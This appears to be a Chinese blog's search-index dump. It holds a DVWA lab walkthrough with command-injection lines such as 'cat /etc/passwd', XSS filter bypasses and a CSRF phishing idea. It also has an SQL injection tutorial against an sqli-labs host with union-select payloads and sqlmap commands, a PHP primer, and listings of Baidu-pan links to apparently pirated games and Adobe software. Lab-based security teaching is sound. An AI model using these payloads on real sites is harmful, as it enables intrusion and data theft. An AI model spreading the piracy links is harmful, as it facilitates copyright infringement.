line.add_yaxis(\u0026#34;GDP\u0026#34;,[30,20,10]) line.set_global_opts( title_opts=TitleOpts(title=\u0026#34;GDP展示\u0026#34;,pos_left=\u0026#34;center\u0026#34;,pos_bottom=\u0026#34;1%\u0026#34;), # 参数title设置标题文字，pos_left设置横向位置，pos_bottom设置距离底部位置 legend_opts=LegendOpts(is_show=True), # 设置图例是否显示 toolbox_opts=ToolboxOpts(is_show=True), # 设置工具箱是否显示 visualmap_opts=VisualMapOpts(is_show=True), ) # 生成图表 line.render() 结果如下：\n","date":"2025-12-01T08:35:11+08:00","permalink":"https://www.retr0.xyz/p/10.2-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86json-%E6%A0%BC%E5%BC%8F%E5%92%8C-pyecharts-%E5%85%A5%E9%97%A8/","title":"10.2 前置知识：json 格式和 pyecharts 入门"},{"content":" 本篇文章如未特别强调，均使用提供的Win10进行实验\n靶场的获取与配置 本篇内容基于dvwa靶场，文件已经放在文章0.安全类工具文件资源库中了，这里再贴出来一次\n链接：https://pan.baidu.com/s/1dmU9DcXAthjY0te4qv4tAg 提取码：38mj\n下载得到dvwa汉化版.zip，将压缩包里dvwa文件夹里的文件解压到C:\\phpstudy_pro\\WWW中，注意提前将phpmyadmin以外的其他文件删除\n打开phpstudy，在“网站”菜单中的“管理”处设置php版本为5.6.x; 到“设置”-“配置文件”中点击你上面选择的php版本打开配置文件 使用Ctrl+F搜索allow_url_fopen和allow_url_include确保这两项后面的配置都是On，保存文件 回到首页，启动Apache和MySQL，打开FireFox浏览器访问127.0.0.1，点击下面的 |创建/重置数据库| 按钮 登录，用户名为：admin，密码为：password 在DVWA安全页面里设置安全等级为low 靶场的使用 提前配置好抓包环境并打开burp suite，详见1.1 抓包和web基本知识\n小贴士：可以在phpstudy目录下新建test.php用来测试代码中看不懂的部分\n暴力破解 Brute Force 打开dvwa中暴力破解页面，可以点击右下角查看源代码简单分析功能如何实现\n现在随便输入用户名和密码（以分别为admin；123为例），同时启用抓包，点击“登陆”，发现已经抓到相应数据包，右键空白处点击“Send to Intruder\u0026quot;后放行数据包 转到Intruder-Positions页面，这里需要我们设置要暴力破解哪个部分，我们先点击Clear§，然后选中密码部分（也就是123），点击add§,Attack Type选择sniper 转到Payloads选项中，可以在Payloads Options中添加可能的密码或直接导入字典 点击Start attack等待攻击完成提示Finished 点击Length按照长度排序，发现“password”的长度明显与其他不同，说明password是正确密码 补充1(点击展开)：不同的攻击模式：\nsniper 模式[单向爆破] 知道用户名不知道密码的情况，破解一些单一的输入框battering ram 模式[并发攻击] 对多个目标进行单一的payload攻击，也就是用户名和密码一致pitchfork 模式[交叉攻击(撞库)] 有几个变量就可以选几个字典，从字典中随机抽取穷举cluster bomb 模式[完整爆破] 从字典中挨个抽取尝试 命令注入 Command injection（命令执行漏洞） 所谓命令执行漏洞就是说一个地方可以执行操作系统的命令\nlow 低难度 打开dvwa中命令注入页面，可以点击右下角查看源代码简单分析功能如何实现\n补充2(点击展开)：在Windows CMD中可以通过\u0026amp;、\u0026amp;\u0026amp;符号同时输入并执行两条指令，其他也有|、||等在特定条件下可用\n例如执行ping www.retr0.xyz \u0026amp; ipconfig，输出\n正在 Ping www.retr0.xyz [104.21.69.83] 具有 32 字节的数据: 来自 104.21.69.83 的回复: 字节=32 时间=211ms TTL=128 来自 104.21.69.83 的回复: 字节=32 时间=202ms TTL=128 来自 104.21.69.83 的回复: 字节=32 时间=200ms TTL=128 来自 104.21.69.83 的回复: 字节=32 时间=201ms TTL=128 104.21.69.83 的 Ping 统计信息: 数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)， 往返行程的估计时间(以毫秒为单位): 最短 = 200ms，最长 = 211ms，平均 = 203ms Windows IP 配置 以太网适配器 Ethernet0: 连接特定的 DNS 后缀 . . . . . . . : localdomain 本地链接 IPv6 地址. . . . . . . . : fe80::9087:a026:a5bf:e1c5%12 IPv4 地址 . . . . . . . . . . . . : 192.168.80.134 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . : 192.168.80.2 我们直接填入`127.0.0.1 \u0026 ipconfig`即可 high 高难度 现在我们加大难度为high，重新查看源代码发现多出了过滤机制\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 // Set blacklist $substitutions = array( \u0026#39;\u0026amp;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;| \u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;-\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;$\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;(\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;)\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;`\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;||\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 补充3(点击展开)：str_replace的用法：str_replace(\u0026quot;要换的字符串\u0026quot;,\u0026quot;替换为\u0026quot;,作用于哪个变量)，例如：\n\u0026lt;?php $a = $_GET['username']; $b = str_replace('t','x',$a); echo $b; ?\u0026gt; 打开url:http://127.0.0.1/test.php?username=retr0，返回 rexr0\n漏洞解析： 观察发现屏蔽名单中\u0026rsquo;| \u0026lsquo;为一个管道符加一个空格，因此我们填入127.0.0.1 |ipconfig即可\n如果在linux环境下 ping 127.0.0.1 \u0026amp; cat /etc/passwd\t几乎同时执行\nping 127.0.0.1 \u0026amp;\u0026amp; cat /etc/passwd\t执行完左边去执行右面\nping 127.0.0.1 | cat /etc/passwd\t只执行右面\n反射型跨站点脚本（XSS） 打开dvwa中XSS 反射型页面，随便输入几个字符测试，以retr0为例\nlow 低难度 右键查看页面源代码发现提交的字符会直接填到下面的“你好”后面，如图：\n结合右下角查看php源代码也可以得到\n漏洞解析： 因此我们可以在输入的字符串中插入\u0026lt;script\u0026gt;\u0026lt;/script\u0026gt;的html脚本，让网页执行我们的脚本代码\n填入ret\u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt;r0,网页弹窗内容‘123’\nmedium 中等难度 点击右下角查看源代码发现添加了过滤机制：\n1 $name = str_replace( \u0026#39;\u0026lt;script\u0026gt;\u0026#39;, \u0026#39;\u0026#39;, $_GET[ \u0026#39;name\u0026#39; ] ); 漏洞解析： 屏蔽代码只过滤了一次\u0026lt;script\u0026gt;，因此我们使用双写绕过，填入ret\u0026lt;sc\u0026lt;script\u0026gt;ript\u0026gt;alert(123)\u0026lt;/script\u0026gt;r0，其中\u0026lt;script\u0026gt;被过滤后又重新组合为新的\u0026lt;script\u0026gt;从而生效；此外将\u0026lt;script\u0026gt;中的字符替换为大写也可以，例如ret\u0026lt;sCRIpt\u0026gt;alert(123)\u0026lt;/script\u0026gt;r0（原理：前端代码不识别\u0026lt;script\u0026gt;大小写）\nhigh 高难度 点击右下角查看源代码发现升级了过滤机制：\n1 $name = preg_replace( \u0026#39;/\u0026lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i\u0026#39;, \u0026#39;\u0026#39;, $_GET[ \u0026#39;name\u0026#39; ] ); 因此直接使用\u0026lt;script\u0026gt;的方法已经完全不可用\n补充4(点击展开)：html存在以下加载图片的句法：\n\u0026lt;img src='x' onerror='alert(123)'/\u0026gt;\n当页面试图加载名为x的图片但是失败时就会把onerror后面的代码当作JavaScript来执行\n另外还有onmouseover=(鼠标浮过)onmouseup=(鼠标松开)onmousedown=(鼠标按下)等参数可供替换\n漏洞解析： 我们利用html图片加载代码来执行js，填入ret\u0026lt;img src='x' onerror='alert(123)'/\u0026gt;r0\n存储的跨站点脚本（XSS） 打开dvwa中XSS 存储型页面，随便输入几个字符测试\nlow 低难度 发现和上面的反射型原理类似，直接填入留言hel\u0026lt;script\u0026gt;alert(123)\u0026lt;/script\u0026gt;lo\nmedium 中等难度 查看源代码发现在留言上启用了htmlspecialchars（将特定的 HTML 字符转换为 HTML 实体字符），名字上添加了过滤，如下：\n1 2 3 $message = htmlspecialchars( $message ); $name = str_replace( \u0026#39;\u0026lt;script\u0026gt;\u0026#39;, \u0026#39;\u0026#39;, $name ); 因此我们针对名字下手，直接填入双写绕过的字符串发现网页对长度有限制，所以要用burp suite修改数据包\n随便填写名字和留言（以123；hello）为例，打开抓包后点击“提交留言”，发现截获的数据包有以下内容（不一定完全一致）：\ntxtName=123\u0026amp;mtxMessage=hello\u0026amp;btnSign=%E6%8F%90%E4%BA%A4%E7%95%99%E8%A8%80\n将这里的123改为hel\u0026lt;sc\u0026lt;script\u0026gt;ript\u0026gt;alert(123)\u0026lt;/script\u0026gt;lo后放行数据包发现提交成功\nhigh 高难度 查看源代码发现名字对\u0026lt;script\u0026gt;的屏蔽升级：\n1 $name = preg_replace( \u0026#39;/\u0026lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i\u0026#39;, \u0026#39;\u0026#39;, $name ); 漏洞解析： 依旧结合抓包使用图片加载机制传入字符串hel\u0026lt;img src='x' onerror='alert(123)'/\u0026gt;lo，成功提交\n跨站请求伪造 (CSRF) low 低难度 打开dvwa中跨站请求伪造 (CSRF)页面，随便输入几个字符测试\n获取当前页面的url：http://127.0.0.1/vulnerabilities/csrf/?password_new=password\u0026amp;password_conf=password\u0026amp;Change=æ´æ¹#\n应用场景： 利用上面的连接制作钓鱼网站诱导某网站管理员点击该链接即可直接修改管理员密码\n","date":"2025-11-30T14:10:19+08:00","permalink":"https://www.retr0.xyz/p/1.6-%E5%85%B6%E4%BB%96%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/","title":"1.6 其他基础web漏洞介绍"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\nWatch Dogs 3 [看门狗3：军团] 有解压密码！ https://pan.baidu.com/s/1fv6JvJKRZGL3q9qYcfklyA?pwd=mmjp ","date":"2025-11-30T10:29:51+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90%E5%BC%80%E6%94%BE%E4%B8%96%E7%95%8C%E5%92%8Crpg%E7%B1%BB/","title":"游戏资源：开放世界和RPG类"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\nPlagueInc [瘟疫公司] https://pan.baidu.com/s/1j0bWB6twLDmx8WKHKfYpQw?pwd=7ih8\nCommand and Conquer Red Alert 3 [红色警戒3] https://pan.baidu.com/s/1IYQSA-F7McqPmSKl8a8j9w?pwd=r9tu\nEuro.Truck.Simulator.2.v1.44.1.1s [欧洲卡车模拟2] https://pan.baidu.com/s/1sBThylD4nLZ2S-EZvYxsBw?pwd=3smf\nForza Horizon 5 [极限竞速：地平线5] https://pan.baidu.com/s/12gktk9uyoj_M_WwMVhFykQ?pwd=63w6\nHeart of Iron IV [钢铁雄心4全DLC] https://pan.quark.cn/s/b3f595782bc2\n","date":"2025-11-29T23:01:17+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E6%A8%A1%E6%8B%9F%E7%B1%BB/","title":"游戏资源：策略和模拟类"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\nThe Farmer Was Replaced [编程农场] https://pan.baidu.com/s/1A91Vk-2It-QHxY6ySZF3_Q?pwd=qf4a ","date":"2025-11-29T22:46:07+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90%E5%85%B6%E4%BB%96%E7%8B%AC%E7%AB%8B%E5%B0%8F%E6%B8%B8%E6%88%8F/","title":"游戏资源：其他独立小游戏"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\n[轻音少女 放学后演唱会！!老版汉化+新版高清重制生肉 PSP镜像] https://pan.baidu.com/s/1voHcmMSed43GeUKsoatILA?pwd=it14\n","date":"2025-11-29T22:45:48+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%B1%BB/","title":"游戏资源：模拟器类"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\nSifu [师傅] https://pan.baidu.com/s/1S6AG2zyuzII_IWnKaJf-0A?pwd=hb3e ","date":"2025-11-29T22:45:22+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90%E5%8A%A8%E4%BD%9C%E6%A0%BC%E6%96%97%E7%B1%BB/","title":"游戏资源：动作格斗类"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\n[魔法少女的魔女审判] https://pan.baidu.com/s/1A6-jTkGcgWslufbaSzfwpQ?pwd=1d5a ATRI -My Dear Moments-[亚托莉 -我挚爱的时光-] https://pan.baidu.com/s/1XlReK-Tqciw1Fvy6CMuyaA?pwd=6tc5 Ace.Attorney.Investigations.Collection [逆转检事 1\u0026amp;2 御剑精选集] https://pan.baidu.com/s/1_pyzQKjhMoEoKgtFfxK6qA?pwd=ndfw Phoenix Wright Ace Attorney Trilogy [逆转裁判 1,2,3 成步堂精选集] https://pan.baidu.com/s/1fYdMkw4yXT2pvXV6MLJx7g?pwd=cfaw [饿殍：明末千里行] https://pan.baidu.com/s/1W8ppqSzJu4eLha9M3K6pZA?pwd=qp4s [爱上火车-Last Run!!-] https://pan.baidu.com/s/1Y65Ewgmt51Ym6V0xy19i7A?pwd=7x2g ","date":"2025-11-29T22:44:48+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90galgame%E7%B1%BB%E5%92%8C%E8%A7%86%E8%A7%89%E5%B0%8F%E8%AF%B4%E7%B1%BB/","title":"游戏资源：Galgame类和视觉小说类"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找游戏请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\nReady Or Not [严阵以待] https://pan.baidu.com/s/1wW1S2dGabcJYJ-acglLd2A?pwd=ehrw Escape from Duckov [逃离鸭科夫] https://pan.baidu.com/s/1bwzu7BOxRYa17YqqD-ekow?pwd=uq1d ","date":"2025-11-29T22:44:25+08:00","permalink":"https://www.retr0.xyz/p/%E6%B8%B8%E6%88%8F%E8%B5%84%E6%BA%90fps%E6%88%96tps%E7%B1%BB/","title":"游戏资源：FPS或TPS类"},{"content":"!!!!重要：所有资源文件格式都是压缩包，务必使用压缩软件打开！在文章内部查找软件请按Ctrl+F搜索！资源均为个人收集，如有链接失效请通过电子邮件按钮联系博主！资源仅供尝鲜，还请多多支持正版！\nAdobe全家桶 单个软件版（指挑选需要的软件安装） https://pan.baidu.com/s/1ZlBQvcGhgLrxq3vpY555Zg?pwd=q4wh\nAdobe全家桶 一键安装全套 https://pan.baidu.com/s/1cdRjOAQmKTEcd59LpYZ0HQ?pwd=n5vv\n","date":"2025-11-29T22:42:14+08:00","permalink":"https://www.retr0.xyz/p/%E8%BD%AF%E4%BB%B6%E8%B5%84%E6%BA%90/","title":"软件资源"},{"content":"手动注入 以靶场http://sqlilabs.njhack.xyz/Less-1/index.php为例\nStep1：破坏数据库语句 破坏数据库语句的目的就是让数据库报错，通过报错信息猜测查询语句的写法\n数据库传入参数的几种闭合方式：\n1 2 3 4 5 6 7 8 \u0026#39;\u0026#39; \u0026#34;\u0026#34; () ((\u0026#39;\u0026#39;)) (\u0026#34;\u0026#34;) ((\u0026#34;\u0026#34;)) (()) 没有闭合方式 补充1：\n\\称为转义字符，可以把自己后面的第一个东西当作字符串去执行\n我们传入以下参数：2\\\n有如下报错：\n我们选取其中核心部分''2\\' LIMIT 0,1'去掉头尾（因为头尾用来闭合的符号是php报错语句携带的，不是真实代码）\n1 \u0026#39;2\\\u0026#39; LIMIT 0,1 由此得知该数据库的查询语句是单引号''闭合\n因此大概估计查询语句可能为\n1 select username,password from tablex where id = \u0026#39;$id\u0026#39; limit 0,1 解释：此处limit a,b语法指从数据表的第a条起选取b条数据\n数据表条目要从第0个开始数\n补充2：\n数据库的注释符：--、/**/、# +在GET请求里相当于空格 +一般配合--作为GET请求的注释符使用\n接下来我们传入参数id=2' --+，那么拼成的语句是：\n1 select username,password from tablex where id = \u0026#39;2\u0026#39; --+ \u0026#39;limit 0,1 由于--把后面的内容都注释掉了，实际上执行的数据库语句应该是：\n1 select username,password from tablex where id = \u0026#39;2\u0026#39; 提交参数发现查询正常（如图），说明它真的是用''进行闭合的\nStep2：确定查询了多少个栏目 从现在开始我们要调用各种语法查询数据，记住之后的语法全部都是插入在2' {} --+中的花括号位置！\n因为之前的语句中username,password栏目是猜测的，所以接下来要核实究竟有多少个栏目\n传入参数2' order by [数字] --+使用二分法查看\n依次传参，其中数字填为10、5、3\u0026hellip;\u0026hellip;\n当数字最大为3时有结果，改为4时没有结果\n因此确定查询出了3个栏目，之前的猜测错误\n修正：可能的查询项目是id,username,password\nStep3：显示报错位 传入参数2' union select 1,2,3 --+返回结果\n但是我们想要让查询的1,2,3显示出来，所以要故意让union之前的查询语句出错掩盖掉正常数据\n传入参数-2' union select 1,2,3 --+返回结果\n说明2、3号位是报错位（显示位）\n补充3：\nunion select a,b,c语法为联合查询，方便我们将两条查询语句捆绑起来一起执行，而且即便其中一条查询语句报错也不影响另一条查询语句输出结果，本地演示效果如下：\n第二条select查询的1,2,3正好与前面查询的3个项目一一对应显示，因此第二条select内容务必参照Step2中获得的查询栏目数填写！\nStep4：查看数据库的库名 使用语法database()替换任意报错位\n传入参数-2' union select 1,database(),3 --+返回结果:\n此时2号位对应显示的就是数据库的库名：security\nStep5：根据库名查看表名 补充4：\n数据库中一般有一个库名为information_schema其中有名为TABLES的数据表，里面统计了各个数据库名及其对应包含的表名，其中数据库名所在的列（栏目）为TABLE_SCHNEMA，数据表名所在的列（栏目）为TABLE_NAME，如图\n所以我们要编辑一下第二条查询语句让他能查询到information_schema库中TABLES表中的TABLE_NAME栏目，并且要限制条件TABLE_SCHEMA=\u0026lsquo;security\u0026rsquo;，整合一下需求：\n1 -2\u0026#39; union select 1,TABLE_NAME,3 from information_schema.TABLES where TABLE_SCHEMA=\u0026#39;security\u0026#39; --+ 为了方便一个个查询符合的数据（一个个查看security库中的表名）我们可以在第二条语句后面补充limit 0,1，之后依次修改前一个数字为1、2、3、4\u0026hellip;\u0026hellip;即可，也就是：\n1 -2\u0026#39; union select 1,TABLE_NAME,3 from information_schema.TABLES where TABLE_SCHEMA=\u0026#39;security\u0026#39; limit 0,1 --+ 传入参数后发现有4张表：emails referers uagents users\n显然users这个表对我们应该更有用\nStep6：查询所需表的列（栏目）名 补充5：\ninformation_schema这个库中还有一个名为COLUMNS的表，里面记录了某个数据库（TABLE_SCHEMA）当中每个表（TABLE_NAME）里包含的栏目(COLUMN_NAME)\n所以我们现在的需求就是去information_schema.COLUMNS表中查找COLUMN_NAME栏目来看看security里users这个表有哪些栏目，并且添加限定条件TABLE_SCHEMA='security' and TABLE_NAME='users'整合需求得到以下参数\n1 -2\u0026#39; union select 1,COLUMN_NAME,3 from information_schema.COLUMNS where TABLE_SCHEMA=\u0026#39;security\u0026#39; and TABLE_NAME=\u0026#39;users\u0026#39; limit 0,1 --+ 依次修改limit的值发现有这三个栏目：id username password\nStep7：全部取出username及对应password 补充6：\n使用group_concat(栏目名)可以取出对应栏目的所有数据\n方法一：group_concat()语法 传入以下参数：\n1 -2\u0026#39; union select 1,group_concat(username),group_concat(password) from users --+ 返回结果：\n注：此方法在之前需要使用limit语法的地方也可尝试\n方法二：limit a,b 语法 适用情况：网站有输出长度限制\n与之前相同，在参数后面添加limit 0,1手动修改依次输出\n工具辅助注入 sqlmap 用法（使用Kali版本） 慢速通用版：\nSTEP1:sqlmap -u [目标url] --dbs也可使用sqlmap -u [目标url] --current-db\n前者获取目标网站的所有库名，后者获取当前数据库名\nSTEP2:sqlmap -u [目标url] -D [库名] --tables\n获取指定库里的表\nSTEP3:sqlmap -u [目标url] -D [库名] -T [表名] --columns\n获取指定表里的栏目\nSTEP4:sqlmap -u [目标url] -D [库名] -T [表名] -C xxx,xxx --dump\n获取表里指定栏目的数据\n完毕\n快速版（也需要分步添加参数）：\nsqlmap -u [目标url] --dbs --batch --threads 10 --technique U\n使用sqlmap查看目标网站的数据库库名，忽略错误，开10线程，使用union select注入目标网站\n补充：\n\u0026ndash;technique X 中后接参数的其他类型\nE = 报错注入 error based（无法发现报错位，但是数据库报错会出现）\nB = 布尔型注入 booled based（无法发现报错位，数据库闭合破坏也不出现，但是界面上只会出现有和没有东西两种情况）\nT = 布尔型时间盲注 time based（无法发现报错位，数据库闭合被破坏也不出现，界面上也没有出现消失东西的情况）\n略微引申：POST类型的注入 以靶场http://sqlilabs.njhack.xyz/Less-11/index.php为例\nSTEP1：随便提交数据，使用burp suite抓包\n输入账号：admin1 密码：admin1\n抓包得到post内容uname=admin1\u0026amp;passwd=admin1\u0026amp;submit=Submit\nSTEP2：使用sqlmap注入\nsqlmap -u http://sqlilabs.njhack.xyz/Less-11/index.php --data \u0026quot;uname=admin1*\u0026amp;passwd=admin1\u0026amp;submit=Submit\u0026quot; --current-db --batch --threads 10 --technique U\n注意：\u0026ndash;data后跟着的\u0026quot;\u0026quot;包裹字符串内容要在打击处用*做标记\n接下来的步骤略\n拓展知识 web渗透中目标不同的组合：\nWindows+iss+asp/aspx(asp.net)+access/mssql\nWindows+apache+php+mysql = wamp （一般使用软件进行集成化搭建）\nlinux+apache/nginx+php+mysql = lamp/lnmp （又可能使用宝塔或其他面板搭建）\nlinux+tomcat+java(jsp)+oracle/mysql\nlinux+nginx+python(django/flask/tornado/fastapi)+go(beego/gin)+mysql\n","date":"2025-11-28T20:07:03+08:00","permalink":"https://www.retr0.xyz/p/1.5-mysql%E6%B3%A8%E5%85%A5%E5%88%9D%E6%AD%A5/","title":"1.5 mysql注入初步"},{"content":"用户交互 基本结构 核心架构和输出操作 php的基本结构是这样的：\n1 2 3 \u0026lt;?php echo \u0026#34;Hello World!\u0026#34;; ?\u0026gt; 此处echo就相当于Python里的print输出\n且中间部分每行结尾一定一定要加;（因为真的很容易忘）\n变量 此外，再输出内容中如果有多个部分组成请用英文句号.隔开（相当于python中print里的逗号全部换成句号，仅此而已）例如：\n1 2 3 4 \u0026lt;?php $a = \u0026#34;Hi!\u0026#34;; echo $a.\u0026#34;Hello!\u0026#34;; ?\u0026gt; if 判断 Quickstart：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php // 定义一个简单的变量 $age = 18; // if判断：如果$age大于等于18，执行花括号里的代码 if ($age \u0026gt;= 18) { echo \u0026#34;你已经成年啦！\u0026#34;; } // 再补一个if-else的简单例子 $score = 59; if ($score \u0026gt;= 60) { echo \u0026#34;考试及格啦！\u0026#34;; } else { echo \u0026#34;考试不及格，继续加油！\u0026#34;; } ?\u0026gt; 由此可见，它的基本结构是这样的：\n1 2 3 4 5 6 7 if (判断条件) { 语句块1; 语句块2; } else { 语句块1; 语句块2; } while 循环 Quickstart：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php // 初始化计数器 $i = 1; // while循环：只要$i小于等于5，就执行循环体 while ($i \u0026lt;= 5) { echo \u0026#34;当前数字是：{$i}\u0026lt;br/\u0026gt;\u0026#34;; // 计数器自增（必须写，否则会无限循环！） $i++; } ?\u0026gt; 由此可见，它的基本结构应该是这样的：\n1 2 3 4 while (循环判断条件) { 语句块1; 语句块2; } 变量格式 php中的变量没有数据类型，一律在变量名前面加上$，例如\n1 2 3 4 \u0026lt;?php $a = \u0026#34;Hi!\u0026#34;; echo $a; ?\u0026gt; GET 命令 使用GET命令可以获取用户输入的信息并赋值给变量，例如：\n1 2 3 4 \u0026lt;?php $a = $_GET[\u0026#39;name\u0026#39;]; echo $a; ?\u0026gt; 然后php可以通过地址(url)获取变量值，例如：\nhttp://localhost/index.php?name=example\n那如果有多个变量呢？\n1 2 3 4 5 6 \u0026lt;?php $a = $_GET[\u0026#39;name\u0026#39;]; $b = $_GET[\u0026#39;job\u0026#39;]; echo $a; echo \u0026#34;你的工作是\u0026#34;.$b; ?\u0026gt; http://localhost/index.php?name=example\u0026amp;job=xxx即可\n尤其注意： 在php文件后加上?变量名1=变量值1\u0026amp;变量名2=变量值2的格式\nPOST 命令 很简单，把上面的GET全改为POST就行了\n1 2 3 4 \u0026lt;?php $a = $_POST[\u0026#39;name\u0026#39;]; echo $a; ?\u0026gt; 不过这时候需要我们手动去提交POST，像这样：\n数据库交互之增删改查 登录phpmyadmin(http://localhost/phpmyadmin)创建一个示例数据库并随便写几条示例数据进去，过程略\n连接数据库 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php // 1. 配置连接 $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;root\u0026#34;; $dbname = \u0026#34;test\u0026#34;;\t//数据库库名 // 2. 创建链接 $conn = new mysqli($servername,$username,$password,$dbname); // 3. 检测连接 if($conn-\u0026gt;connect_error){ die(\u0026#34;连接失败\u0026#34;.$conn-\u0026gt;connect_error); } ?\u0026gt; 操作：查 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php // 1. 配置连接 $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;root\u0026#34;; $dbname = \u0026#34;test\u0026#34;;\t//数据库库名 // 2. 创建链接（使用mysqli函数按格式填写所需参数） $conn = new mysqli($servername,$username,$password,$dbname); // 3. 检测连接 if($conn-\u0026gt;connect_error){ die(\u0026#34;连接失败\u0026#34;.$conn-\u0026gt;connect_error); } // 数据库查询语句================================================================ //准备一条数据库语句 $sql = \u0026#34;select * from db1 where id \u0026lt; 3\u0026#34;; // 这里相当于把查询指令赋值给$sql // 执行sql语句并返回给变量 $result = $conn-\u0026gt;query($sql); // 判断result里是否有东西 if($result-\u0026gt;num_rows\u0026gt;0){\t// $result-\u0026gt;num_rows获取结果集中的行数 // 输出数据 while($row = $result-\u0026gt;fetch_assoc()){\t// 每次从结果集中读取一行数据，并以关联数组形式返回 echo $row[\u0026#39;id\u0026#39;].\u0026#39;-----\u0026#39;.$row[\u0026#39;uid\u0026#39;].\u0026#39;-----\u0026#39;.$row[\u0026#39;job\u0026#39;].\u0026#39;\u0026lt;br/\u0026gt;\u0026#39;; } }else{ echo \u0026#34;无结果\u0026#34;; } $conn-\u0026gt;close();\t// 关闭数据库 ?\u0026gt; 特别的，这里使用的sql语句格式为\u0026quot;select * from 数据表名 where 筛选条件\u0026quot;\n操作：增 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php // 1. 配置连接 $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;root\u0026#34;; $dbname = \u0026#34;test\u0026#34;;\t//数据库库名 // 2. 创建链接（使用mysqli函数按格式填写所需参数） $conn = new mysqli($servername,$username,$password,$dbname); // 3. 检测连接 if($conn-\u0026gt;connect_error){ die(\u0026#34;连接失败\u0026#34;.$conn-\u0026gt;connect_error); } // 数据库增语句============================================================== //准备一条数据库语句 $sql = \u0026#34;insert into db1(uid,pwd,job) values(\u0026#39;u5\u0026#39;,\u0026#39;666\u0026#39;,\u0026#39;driver\u0026#39;)\u0026#34;; // 这里相当于把增加指令赋值给$sql if($conn-\u0026gt;query($sql)===true){ echo \u0026#34;新纪录插入成功\u0026#34; }else{ echo \u0026#34;插入失败\u0026#34;.$conn-\u0026gt;error; } $conn-\u0026gt;close();\t// 关闭数据库 ?\u0026gt; 特别的，这里使用的sql语句格式为:\n\u0026quot;insert into 数据表名(关键字1,关键字2,关键字3) values('值1','值2','值3')\u0026quot;\n操作：改 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php // 1. 配置连接 $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;root\u0026#34;; $dbname = \u0026#34;test\u0026#34;;\t//数据库库名 // 2. 创建链接（使用mysqli函数按格式填写所需参数） $conn = new mysqli($servername,$username,$password,$dbname); // 3. 检测连接 if($conn-\u0026gt;connect_error){ die(\u0026#34;连接失败\u0026#34;.$conn-\u0026gt;connect_error); } // 数据库修改语句============================================================== //准备一条数据库语句 $sql = 